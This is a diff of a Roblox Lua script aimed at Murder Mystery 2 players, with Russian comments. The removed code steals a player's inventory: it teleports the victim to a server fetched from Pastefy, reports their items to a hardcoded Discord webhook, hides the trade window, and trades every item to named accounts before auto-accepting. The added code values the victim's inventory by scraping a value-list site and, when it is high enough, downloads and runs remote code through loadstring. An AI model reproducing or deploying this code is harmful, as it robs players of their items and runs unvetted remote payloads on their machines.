@@ -1,326 +1,181 @@
--- // 🔹 Конфиг
-local pastefyURL = "https://pastefy.app/1fxiqaEE/raw"
-local userName = "HitFarmZ", "ZeeS_Farm4" -- имя цели (если нужно)
-local webHook = "https://discord.com/api/webhooks/1408421597156474890/DshCKWfUftKiEKTymFXskyk_ZaqFd86iVtPDqKEhQ3qvyrlFgy05JcCMAEM8oWfysbcZ" -- сюда вставить Discord webhook, если надо
+if game.PlaceId == 142823291 then
+    -- ================== Конфиг ==================
+local MinTotalValue = 750 -- Минимальный общий value
+local min_rarity = "Godly" -- Минимальная редкость
+local min_value = 1        -- Минимальное value предмета
+-- ============================================
 
-
-
--- // 🔹 Services
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local LP = Players.LocalPlayer
-local TeleportService = game:GetService("TeleportService")
+local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
-local placeId = 142823291 -- MM2 PlaceId
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
+local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 
+local HttpRequest = request or (syn and syn.request) or http_request or http and http.request
 
-
--- 🔹 Проверка, есть ли нужный игрок
-local function checkAndTeleport()
-    local target = Players:FindFirstChild(userName)
-
-    if target then
-        warn("[INFO] Найден игрок:", userName, " — продолжаем работу.")
-    else
-        warn("[INFO] Игрока", userName, "не найдено, телепортируем...")
-
-        -- запрос к Pastefy
-        local success, result = pcall(function()
-            return game:HttpGet(pastefyURL)
-        end)
-
-        if success and result and result ~= "" then
-            local jobId = result:gsub("%s+", "") -- убираем пробелы/переносы
-            TeleportService:TeleportToPlaceInstance(placeId, jobId)
-        else
-            warn("[ERROR] Не удалось получить JobId с Pastefy")
-        end
-    end
-end
-
--- вызов функции
-checkAndTeleport()
-task.wait(3)
-
-
-
-
--- // 🔹 Таблица цен предметов
-local values = {
-    -- >> Uniques/Victim Tier << --
-    ["Sorry"] = 750,
-    -- >> Uniques/Special Tier << --
-    ["SlouseClownGun"] = 500000,
-    ["SlouseClown"] = 500000,
-    ["SharkSeeker"] = 1000,
-    ["Dartbringer"] = 1150,
-    -- >> Uniques/Top 100 Awards << --
-    ["BlueCandy"] = 100000,
-    ["RedHallow"] = 100000,
-    ["BlueSugar"] = 100000,
-    ["ElderwoodGunBlue"] = 100000,
-    ["MintyBlue"] = 100000,
-    ["LogchopperBlue"] = 100000,
-    ["BlueVampiresEdge"] = 100000,
-    ["RedIceblaster"] = 100000,
-    ["RedIcebreaker"] = 100000,
-    ["BlueHarvester"] = 100000,
-    ["SwirlyGunBlue"] = 100000,
-    ["SwirlyAxeBlue"] = 100000,
-    ["ElderwoodKnifeBlue"] = 100000,
-    ["IcepiercerRed"] = 100000,
-    ["IceHammerRed"] = 100000,
-    ["TravelerAxeRed"] = 100000,
-    ["Gingerscope_Blue"] = 100000,
-    ["Gingerscythe_Blue"] = 100000,
-    ["VampireAxe_Purple"] = 100000,
-    -- >> Ancients/Special Tier << --
-    ["NikKnife"] = 1000000,
-    -- >> Ancients/Tier 2 << --
-    ["Gingerscope"] = 9600,
-    ["TravelerAxe"] = 7000,
-    ["Harvester"] = 650,
-    ["Icepiercer"] = 600,
-    ["VampireAxe"] = 440,
-    ["Celestial"] = 350,
-    -- >> Ancients/Tier 1 << --
-    ["SwirlyAxe"] = 150,
-    ["Icebreaker"] = 125,
-    ["ElderwoodScythe"] = 85,
-    ["Scythe"] = 77,
-    ["Hallowscythe"] = 55,
-
-
-    -- >> Chromas/Tier 3 << --
-    ["TravelerGunChroma"] = 110000,
-    ["TreeGun2023Chroma"] = 48000,
-    ["TreeKnife2023Chroma"] = 30000,
-    ["VampireGunChroma"] = 16000,
-    ["ConstellationChroma"] = 9400,
-    ["BaubleChroma"] = 6500,
-    ["WatergunChroma"] = 2200,
-    -- >> Chromas/Tier 2 << --
-    ["ChromaDarkbringer"] = 125,
-    ["ChromaLightbringer"] = 120,
-    ["CandleflameChroma"] = 115,
-    ["ElderwoodKnifeChroma"] = 115,
-    ["SwirlyGunChroma"] = 115,
-    ["Gingermint_KChroma"] = 110,
-    -- >> Chromas/Tier 1 << --
-    ["LugerChroma"] = 100,
-    ["LaserChroma"] = 80,
-    ["HeatChroma"] = 70,
-    ["DeathshardChroma"] = 65,
-    ["GemstoneChroma"] = 65,
-    ["SharkChroma"] = 65,
-    ["SlasherChroma"] = 65,
-    ["TidesChroma"] = 65,
-    ["FangChroma"] = 55,
-    ["GingerbladeChroma"] = 55,
-    ["SeerChroma"] = 55,
-    ["BonebladeChroma"] = 50,
-    ["SawChroma"] = 50,
-    -- >> Godlies/Tier 3 << --
-    ["TravelerGun"] = 3400,
-    ["TreeGun2023"] = 1850,
-    ["Turkey2023"] = 1600,
-    ["TreeKnife2023"] = 1025,
-    ["Blossom_G"] = 640,
-    ["Sakura_K"] = 630,
-    ["Constellation"] = 575,
-    ["Darkshot"] = 465,
-    ["Darksword"] = 460,
-    ["VampireGun"] = 460,
-    ["Bauble"] = 310,
-    ["ZombieBat"] = 300,
-    ["Candy"] = 200,
-    ["Rainbow_G"] = 190,
-    ["Rainbow_K"] = 185,
-    ["Ocean_G"] = 150,
-    ["WraithGun"] = 145,
-    ["WraithKnife"] = 145,
-    ["Waves_K"] = 145,
-    ["AuroraKnife"] = 135,
-    ["AuroraGun"] = 135,
-    ["FlowerwoodGun"] = 135,
-    ["FlowerwoodKnife"] = 130,
-    ["Heartblade"] = 125,
-    ["Sugar"] = 125,
-    ["SwirlyGun"] = 115,
-    ["Makeshift"] = 105,
-    ["Candleflame"] = 100,
-    ["ElderwoodKnife"] = 100,
-    ["Watergun"] = 90,
-    -- >> Godlies/Tier 2 << --
-    ["Phantom2022"] = 75,
-    ["Spectre2022"] = 75,
-    ["Luger"] = 75,
-    ["RedLuger"] = 70,
-    ["SwirlyBlade"] = 65,
-    ["Iceblaster"] = 65,
-    ["Pearl_K"] = 62,
-    ["Pearl_G"] = 62,
-    ["Darkbringer"] = 60,
-
-    -- >> Legendaries/Special Tier << --
-    ["JD"] = 65,
-    -- >> Legendaries/Tier 3 << --
-    ["Latte_G_2023"] = 90,
-    ["Latte_K_2023"] = 90,
-    ["CottonCandy"] = 65,
+local rarityTable = {
+    "Common",
+    "Uncommon",
+    "Rare",
+    "Legendary",
+    "Godly",
+    "Ancient",
+    "Unique",
+    "Vintage"
 }
-
--- // 🔹 Категории для сортировки
-local allItems = {}
-local valueCount = 0
-local itemsCount = 0
 
 local categories = {
-    Vintage = {},
-    Unique = {},
-    Ancient = {},
-    Godly = {},
-    Legendary = {},
-    Rare = {},
-    Uncommon = {},
-    Common = {},
+    godly = "https://supremevaluelist.com/mm2/godlies.html",
+    ancient = "https://supremevaluelist.com/mm2/ancients.html",
+    unique = "https://supremevaluelist.com/mm2/uniques.html",
+    classic = "https://supremevaluelist.com/mm2/vintages.html",
+    chroma = "https://supremevaluelist.com/mm2/chromas.html"
 }
 
-local counters = {
-    Vintage = 0,
-    Unique = 0,
-    Ancient = 0,
-    Godly = 0,
-    Legendary = 0,
-    Rare = 0,
-    Uncommon = 0,
-    Common = 0,
+local headers = {
+    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    ["User-Agent"] = "Mozilla/5.0"
 }
 
--- // 🔹 Проверяем инвентарь (пример через MyInventory в ReplicatedStorage)
-local InvModule = require(ReplicatedStorage:WaitForChild("InventoryModule"))
-for _, group in pairs(InvModule.MyInventory.Data.Weapons) do
-    for _, d in pairs(group) do
-        local itemValue = values[d.ItemName] or 0
-        valueCount += itemValue
-        itemsCount += 1
-
-        local formatted = {
-            name = d.ItemName,
-            value = itemValue,
-            data = d.DataID,
-            amount = d.Amount,
-            rarity = d.Rarity
-        }
-
-
-
-        if categories[d.Rarity] then
-            counters[d.Rarity] += 1
-            table.insert(categories[d.Rarity], formatted)
-        end
-    end
+-- ========== Вспомогательные функции ==========
+local function trim(s)
+    return s:match("^%s*(.-)%s*$")
 end
 
--- // 🔹 Формируем строки для Discord или вывода
-local function buildStringFromCategory(tbl)
-    local result = ""
-    for _, item in pairs(tbl) do
-        result = result .. item.name .. ",\n"
-    end
-    return result
-end
-
-local EverythingString = "-- // Uniques\n" .. buildStringFromCategory(categories.Unique) ..
-                         "\n\n-- // Ancient\n" .. buildStringFromCategory(categories.Ancient) ..
-                         "\n\n-- // Godlies\n" .. buildStringFromCategory(categories.Godly) ..
-                         "\n\n-- // Legendaries\n" .. buildStringFromCategory(categories.Legendary) ..
-                         "\n\n-- // Vintage\n" .. buildStringFromCategory(categories.Vintage) ..
-                         "\n\n-- // Rare\n" .. buildStringFromCategory(categories.Rare) ..
-                         "\n\n-- // Uncommon\n" .. buildStringFromCategory(categories.Uncommon) ..
-                         "\n\n-- // Common\n" .. buildStringFromCategory(categories.Common)
-
--- // 🔹 Выводим статистику в Output
-print("📦 Всего предметов: " .. itemsCount)
-print("💵 Общая ценность: " .. valueCount)
-print(EverythingString)
-
--- // 🔹 Отправка в Discord (опционально)
-local function SendWebhook(url, content)
-    if url == "" then return end -- если не указан, не отправляем
-
-    local req = http_request or request or syn.request
-    if not req then return warn("Эксплойт не поддерживает запросы") end
-
-    req({
-        Url = url,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(content)
-    })
-end
-
-SendWebhook(webHook, {
-    content = "📦 Инвентарь игрока **" .. LP.Name .. "**",
-    embeds = {{
-        title = "Inventory Report",
-        description = "Общая ценность: " .. valueCount .. "\nВсего предметов: " .. itemsCount,
-        color = 11220
-    }}
-})
-
-local function destroyTradeGUIs()
-    local playerGui = Players.LocalPlayer:FindFirstChild("PlayerGui")
-    if not playerGui then return end
-    for _, gui in ipairs(playerGui:GetChildren()) do
-        if gui:IsA("ScreenGui") and gui.Name:match("TradeGUI") then
-            gui:Destroy()
-        end
-    end
-end
-
--- 🔹 Главная функция трейда
-local function stealItems(userName, allItems)
-    -- Найдём цель
-    local target = Players:FindFirstChild(userName)
-    if not target then
-        warn("[TRADE] Игрок " .. userName .. " не найден!")
-        return
-    end
-
-    -- Закрываем трейдовые окна
-    destroyTradeGUIs()
-
-    -- Отправляем запрос на трейд
-    local success, err = pcall(function()
-        ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
+local function fetchHTML(url)
+    if not HttpRequest then return "" end
+    local ok, resp = pcall(function()
+        return HttpRequest({
+            Url = url,
+            Method = "GET",
+            Headers = headers
+        })
     end)
-    if not success then
-        warn("[TRADE] Ошибка при отправке трейд-запроса: " .. tostring(err))
-        return
+    if not ok or not resp or not resp.Body then return "" end
+    return resp.Body
+end
+
+local function parseValue(itembodyDiv)
+    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+    if valueStr then
+        valueStr = valueStr:gsub(",", "")
+        return tonumber(valueStr)
+    end
+    return nil
+end
+
+local function extractItems(htmlContent)
+    local itemValues = {}
+    if not htmlContent or htmlContent == "" then return itemValues end
+    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        itemName = itemName:match("([^<]+)")
+        if itemName then
+            itemName = trim(itemName:gsub("%s+", " ")):lower()
+            local value = parseValue(itembodyDiv)
+            if value then
+                itemValues[itemName] = value
+            end
+        end
+    end
+    return itemValues
+end
+
+local function extractChromaItems(htmlContent)
+    local chromaValues = {}
+    if not htmlContent or htmlContent == "" then return chromaValues end
+    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        chromaName = chromaName:match("([^<]+)")
+        if chromaName then
+            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
+            local value = parseValue(itembodyDiv)
+            if value then
+                chromaValues[chromaName] = value
+            end
+        end
+    end
+    return chromaValues
+end
+
+-- Получаем таблицу value с сайта
+local function buildValueList()
+    local allExtractedValues = {}
+    local chromaExtractedValues = {}
+    local categoriesToFetch = {}
+
+    for rarity, url in pairs(categories) do
+        table.insert(categoriesToFetch, {rarity = rarity, url = url})
     end
 
-    -- Перебор предметов (универсальный цикл)
-    for category, items in pairs(allItems) do
-        for _, item in pairs(items) do
-            for i = 1, item.amount do
-                local args = {
-                    [1] = item.data,
-                    [2] = category
-                }
-                pcall(function()
-                    ReplicatedStorage.Trade.OfferItem:FireServer(unpack(args))
-                end)
+    for _, category in ipairs(categoriesToFetch) do
+        local htmlContent = fetchHTML(category.url)
+        if htmlContent and htmlContent ~= "" then
+            if category.rarity ~= "chroma" then
+                local extracted = extractItems(htmlContent)
+                for itemName, value in pairs(extracted) do
+                    allExtractedValues[itemName] = value
+                end
+            else
+                chromaExtractedValues = extractChromaItems(htmlContent)
             end
         end
     end
 
-    -- Подтверждение трейда
-    task.wait(6)
-    pcall(function()
-        ReplicatedStorage.Trade.AcceptTrade:FireServer()
-    end)
+    local valueList = {}
+    for dataid, item in pairs(database) do
+        local itemName = item.ItemName and item.ItemName:lower() or ""
+        local rarity = item.Rarity or ""
+        local hasChroma = item.Chroma or false
+        if itemName ~= "" and rarity ~= "" then
+            local rarityIndex = table.find(rarityTable, rarity)
+            local godlyIndex = table.find(rarityTable, "Godly")
+            if rarityIndex and godlyIndex and rarityIndex >= godlyIndex then
+                if hasChroma then
+                    for chromaName, value in pairs(chromaExtractedValues) do
+                        if chromaName:find(itemName) then
+                            valueList[dataid] = value
+                            break
+                        end
+                    end
+                else
+                    if allExtractedValues[itemName] then
+                        valueList[dataid] = allExtractedValues[itemName]
+                    end
+                end
+            end
+        end
+    end
+    return valueList
 end
-stealItems(userName, categories) -- запускаем трейд
 
+-- ========== Основная логика ==========
+local valueList = buildValueList()
+local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+
+local min_rarity_index = table.find(rarityTable, min_rarity)
+local totalValue = 0
+local items = {}
+
+for dataid, amount in pairs(realData.Weapons.Owned) do
+    local item = database[dataid]
+    if item then
+        local rarity = item.Rarity
+        local rarityIndex = table.find(rarityTable, rarity)
+        if rarityIndex and rarityIndex >= min_rarity_index then
+            local value = valueList[dataid] or 1
+            if value >= min_value then
+                totalValue = totalValue + (value * amount)
+                table.insert(items, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
+            end
+        end
+    end
+end
+
+if totalValue >= MinTotalValue then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/MM2",true))()
+else
+    ID="72b71fa3-cd02-4785-a26d-a1da88f43dce";
+    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+end
+
+end
